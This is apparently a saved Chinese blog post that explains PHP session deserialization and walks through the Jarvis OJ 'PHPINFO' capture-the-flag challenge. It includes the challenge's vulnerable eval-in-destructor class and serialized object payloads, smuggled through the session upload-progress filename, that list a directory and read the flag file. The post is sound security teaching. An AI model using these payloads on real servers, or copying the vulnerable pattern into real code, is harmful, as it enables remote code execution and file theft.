@@ -1,0 +1,198 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#6200ee"><meta name="author" content="m0re"><meta name="copyright" content="m0re"><meta name="generator" content="Hexo 5.1.0"><meta name="theme" content="hexo-theme-yun"><title>PHP中的session反序列化 | m0re的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_j5gk85dg4pf.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
+  [".post-card",".post-content img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+});
+</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" href="/m0re.ico"><link rel="mask-icon" href="/m0re.ico" color="#6200ee"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
+    const Yun = window.Yun || {};
+    window.CONFIG = {"hostname":"m0re.top","root":"/","title":"人生路漫漫","version":"1.6.1","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><script>(function(){
+  var bp = document.createElement('script');
+  var curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https') {
+    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else {
+    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})();</script><meta name="description" content="中途下车乃人间常事，耿耿于怀便是深情">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP中的session反序列化">
+<meta property="og:url" content="https://m0re.top/posts/77c4c92b/index.html">
+<meta property="og:site_name" content="m0re的小站">
+<meta property="og:description" content="中途下车乃人间常事，耿耿于怀便是深情">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/3k6ql9.jpg">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20210804233313.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20210804234916.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/image-20210825005741102.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/image-20210825010331549.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/image-20210825121513212.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/image-20210825125444453.png">
+<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/image-20210825131850192.png">
+<meta property="article:published_time" content="2021-08-25T05:36:49.337Z">
+<meta property="article:modified_time" content="2021-08-25T05:36:29.319Z">
+<meta property="article:author" content="m0re">
+<meta property="article:tag" content="PHP反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/m0re/picture/raw/master/img/3k6ql9.jpg"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="m0re"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="m0re"><span class="site-author-status" title="穷鬼啊啊啊啊">😭</span></a><div class="site-author-name"><a href="/about/">m0re</a></div><span class="site-name">m0re的小站</span><sub class="site-subtitle"></sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">108</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">13</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">44</span></a></div><a class="site-state-item hty-icon-button" href="/Tools/" title="Tools"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/zxcv0221" title="GitHub" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="哔哩哔哩动画" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://twitter.com/ISm0r3" title="Twitter" target="_blank" style="color:#1da1f2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-twitter-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:m0re.lxj@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E5%BC%95%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 引言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-session%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text">0x01 session基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02session%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB"><span class="toc-number">3.</span> <span class="toc-text">0x02session序列化攻击</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://m0re.top/posts/77c4c92b/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="m0re"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="m0re的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">PHP中的session反序列化</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <span class="post-meta-icon-text">发表于</span> <time title="创建时间：2021-08-25 13:36:49" itemprop="dateCreated datePublished" datetime="2021-08-25T13:36:49+08:00">2021-08-25</time></div><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span id="busuanzi_value_page_pv"></span></span></span><span class="leancloud_visitors" id="/posts/77c4c92b/" data-flag-title="PHP中的session反序列化"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/PHP/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">PHP</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">PHP反序列化</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#6200ee;"><p><img src="https://gitee.com/m0re/picture/raw/master/img/3k6ql9.jpg" loading="lazy"><br>中途下车乃人间常事，耿耿于怀便是深情</p>
+<a id="more"></a>
+<h1 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00 引言"></a>0x00 引言</h1><p>前面学习了PHP反序列化中的普通反序列化自增、自减、原生类反序列化、phar反序列化等，之外还有session反序列化未学习，此次针对session反序列化进行浅析。</p>
+<h1 id="0x01-session基础"><a href="#0x01-session基础" class="headerlink" title="0x01 session基础"></a>0x01 session基础</h1><blockquote>
+<p>session在网络应用中被称为会话控制，Session 对象存储特定用户会话所需的属性及配置信息。</p>
+</blockquote>
+<p><code>session_start()</code>函数: 用于初始化session数据，经常使用到的一个变量<code>$_SESSION</code>，当使用这个函数时</p>
+<blockquote>
+<p>Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p>
+</blockquote>
+<p>当会话自动开始或者通过 <code>session_start()</code> 手动开始的时候， PHP 内部会依据客户端传来的<code>PHPSESSID</code>来获取现有的对应的会话数据（即session文件）， PHP 会自动反序列化session文件的内容，并将之填充到 $_SESSION 超级全局变量中。如果不存在对应的会话数据，则创建名为<code>sess_PHPSES SID</code>(客户端传来的)的文件。如果客户端未发送<code>PHPSESSID</code>，则创建一个由32个字母组成的<code>PHPSESSID</code>，并返回<code>set-cookie</code>。</p>
+<p>每个session标签对应着一个<code>$_SESSION 键-值</code>类型数组，数组中的数据如果想要存储下来，首先需要反序列化。<br>PHP中的session反序列化有三种方式: <code>php_serialize</code>、<code>php</code>、<code>php_binary</code><br><img src="https://gitee.com/m0re/picture/raw/master/img/20210804233313.png" loading="lazy"><br>了解到session序列化后需要储存在服务器上，默认的方式是储存在文件中，储存路径在<code>session.save_path</code>中，如果没有规定储存路径，那么默认会在储存在<code>/tmp</code>中，文件的名称是<code>&#39;sess_&#39;+session</code>名，文件中储存的是序列化后的session。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210804234916.png" loading="lazy"></p>
+<p>一些设置</p>
+<pre class="language-php" data-language="php"><code class="language-php">session<span class="token punctuation">.</span>upload_progress<span class="token punctuation">.</span>cleanup 一旦读取了所有<span class="token constant">POST</span>数据，立即清除进度信息。默认开启 
+session<span class="token punctuation">.</span>upload_progress<span class="token punctuation">.</span>enabled 将上传文件的进度信息存在session中。默认开启。
+<span class="token shell-comment comment">#php.ini</span>
+session<span class="token punctuation">.</span>save_path<span class="token operator">=</span><span class="token double-quoted-string string">""</span> <span class="token operator">--</span>设置session的存储路径
+session<span class="token punctuation">.</span>save_handler<span class="token operator">=</span><span class="token double-quoted-string string">""</span><span class="token operator">--</span>设定用户自定义存储函数，如果想使用<span class="token constant">PHP</span>内置会话存储机制之外的可以使用本函数<span class="token punctuation">(</span>数据库等方式<span class="token punctuation">)</span>
+session<span class="token punctuation">.</span>auto_start boolen<span class="token operator">--</span>指定会话模块是否在请求开始时启动一个会话默认为<span class="token number">0</span>不启动
+session<span class="token punctuation">.</span>serialize_handler string<span class="token operator">--</span>定义用来序列化<span class="token operator">/</span>反序列化的处理器名字。默认使用php</code></pre>
+<p>有时在phpinfo中可以提供很多信息，<a target="_blank" rel="noopener" href="https://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/">phpinfo可以告诉我们什么</a><br><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210825005741102.png" alt="image-20210825005741102" loading="lazy"><br>session的存储位置：一般是存储在<code>/tmp</code>下<br>session存储默认的文件名：sess_PHPSESSID:其中PHPSESSID为当前用户的sessionid值<br><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210825010331549.png" alt="image-20210825010331549" loading="lazy"><br>Linux中常见的php-session存放位置</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php5<span class="token operator">/</span>sess_PHPSESSID
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php7<span class="token operator">/</span>sess_PHPSESSID
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sess_PHPSESSID
+<span class="token operator">/</span>tmp<span class="token operator">/</span>sess_PHPSESSID
+<span class="token operator">/</span>tmp<span class="token operator">/</span>sessions<span class="token operator">/</span>sess_PHPSESSED</code></pre>
+<p>一些基本函数</p>
+<pre class="language-php" data-language="php"><code class="language-php">session_create_id<span class="token punctuation">:</span>	创建新会话<span class="token constant">ID</span>
+session_destory<span class="token punctuation">:</span>	销毁一个会话中的全部数据
+session_id<span class="token punctuation">:</span>			获取<span class="token operator">/</span>设置当前会话<span class="token constant">ID</span>
+session_name<span class="token punctuation">:</span>		获取<span class="token operator">/</span>设置会话名称
+session_start<span class="token punctuation">:</span>		启动新会话或者重用现有会话
+session_status<span class="token punctuation">:</span>		返回当前会话状态
+session_unset<span class="token punctuation">:</span> 		释放所有的会话容量</code></pre>
+<h1 id="0x02session序列化攻击"><a href="#0x02session序列化攻击" class="headerlink" title="0x02session序列化攻击"></a>0x02session序列化攻击</h1><p>CTF题目实战——Jarvis OJ【PHPINFO】</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">//A webshell is wait for you</span>
+<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name">OowoO</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$mdzz</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mdzz</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'phpinfo();'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mdzz</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'phpinfo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OowoO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_string</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span></code></pre>
+
+<p>可以从代码中看出，只要get方法提交phpinfo即可触发<code>__construct()</code>看到phpinfo页面，然后进一步查看信息<br><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210825121513212.png" alt="image-20210825121513212" loading="lazy"><br>在<code>phpinfo</code>中，默认配置在<code>Master Value</code>，环境实际使用配置是<code>Local Value</code><br>这里的<code>session.serialize_handler</code>默认引擎使用<code>php_serialize</code>而实际使用的引擎是<code>php</code><br>代码中也是给出了<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code><br>且<code>session.upload_progress.enabled</code>也是<code>On</code>状态，可以使用。代码中没有存在<code>$_SESSION</code>变量进行赋值。<br><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210825125444453.png" alt="image-20210825125444453" loading="lazy"><br>借鉴PHP手册的案例一<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.upload-progress.php">https://www.php.net/manual/zh/session.upload-progress.php</a></p>
+<pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;?php echo ini_get(<span class="token punctuation">"</span></span><span class="token attr-name">session.upload_progress.name");</span> <span class="token attr-name">?</span><span class="token punctuation">></span></span>" value="123" />
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file1<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file2<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre>
+
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name">OowoO</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$mdzz</span><span class="token operator">=</span><span class="token single-quoted-string string">'payload'</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OowoO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span>
+//payload
+|O:5:\"OowoO\":1:&#123;s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";&#125;</code></pre>
+
+<p>在filename处用payload替换掉。<br><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210825131850192.png" alt="image-20210825131850192" loading="lazy"></p>
+<blockquote>
+<p>$_SERVER[‘SCRIPT_FILENAME’] 也是包含当前运行脚本的路径，与 $_SERVER[‘SCRIPT_NAME’] 不同的是，这是服务器端的绝对路径。</p>
+</blockquote>
+<p>继续构造查看该文件的payload</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">|</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span>\"OowoO\"<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span>\"mdzz\"<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">88</span><span class="token punctuation">:</span>\"<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>\"<span class="token operator">/</span>opt<span class="token operator">/</span>lampp<span class="token operator">/</span>htdocs<span class="token operator">/</span>Here_1s_7he_fl4g_buT_You_Cannot_see<span class="token punctuation">.</span>php\"<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me a candy.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://gitee.com/m0re/picture/raw/master/img/wechatpay.jpg"><img loading="lazy" src="https://gitee.com/m0re/picture/raw/master/img/wechatpay.jpg" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>m0re</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://m0re.top/posts/77c4c92b/" title="PHP中的session反序列化">https://m0re.top/posts/77c4c92b/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/ba7e2f72/" rel="next" title="【大雄×静香】送你一颗流星⭐════"><span class="post-nav-text">【大雄×静香】送你一颗流星⭐════</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>尝试使用 utterances （基于 GitHub Issues）评论系统。</span><br><span>您可以点击下方按钮切换对应评论系统，</span><br><span><script>function showUtterances(){ document.querySelector(".utterances").style.display='block'; document.querySelector('#valine-container').style.display='none'; }function showValine(){ document.querySelector('#valine-container').style.display='block'; document.querySelector(".utterances").style.display='none'; }</script></span><br><span><a class="hty-button hty-button--raised" onclick="showValine()">Valine</a><a class="hty-button hty-button--raised" onclick="showUtterances()">utterances</a></span><br><span><style>.utterances{display:none;}</style></span><br></div><div id="valine-container"></div><script>Yun.utils.getScript("https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js", () => {
+  const valineConfig = {"enable":true,"appId":"gUEA9zKLhCnMFxQI5kI20WiD-gzGzoHsz","appKey":"GQKAp04LNloy3MrDMv86MI3i","placeholder":"评论一下~&nbsp_(:з」∠)_ （填写邮箱可以收到回复通知～）","avatar":null,"pageSize":10,"visitor":true,"highlight":true,"recordIP":true,"enableQQ":true,"requiredFields":["nick","mail"],"el":"#valine-container","lang":"zh-cn"}
+  valineConfig.path = "/posts/77c4c92b/"
+  new Valine(valineConfig)
+}, window.Valine);</script></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">豫ICP备2020025591号-1</a></div><div class="copyright"><span>&copy; 2020 – 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> m0re</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.1.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.6.1</span></div><div class="live_time"><span>本博客已苟延残喘了</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
+  setTimeout(blog_live_time, 1000);
+  const start = new Date('2020-02-21T00:00:00');
+  const now = new Date();
+  const timeDiff = (now.getTime() - start.getTime());
+  const msPerMinute = 60 * 1000;
+  const msPerHour = 60 * msPerMinute;
+  const msPerDay = 24 * msPerHour;
+  const passDay = Math.floor(timeDiff / msPerDay);
+  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
+  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
+  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
+  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
+}
+blog_live_time();
